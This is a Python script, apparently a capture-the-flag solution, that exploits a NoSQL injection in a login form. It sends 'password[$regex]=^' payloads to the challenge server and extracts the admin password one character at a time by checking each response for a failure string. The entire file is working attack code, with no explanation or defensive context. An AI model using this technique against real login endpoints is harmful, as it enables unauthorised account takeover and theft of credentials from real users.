import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password=""
u="http://chals1.ais3.org:54088/login"
#u="http://b799-140-116-117-137.ngrok.io/login"
headers={'content-type': 'application/x-www-form-urlencoded'}

words = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%\'()*+,-./:;<=>?@[\\]^_`{|}~ "



while True:
    for cc in words:
        if cc in '()[]*+.?\\|':
            c='\\'+cc
        else:
            c=cc
        payload='username=%s&password[$regex]=^%s' % (urllib.parse.quote(username), urllib.parse.quote(password + c))
        print(payload)
        r = requests.post(u, data = payload, headers = headers)
        print(r.text)
        if 'Failed qwq' not in r.text or r.status_code == 302:
            print("Found one more char : %s" % (password+c))
            password += c
        else:
            print(f"try {c}")
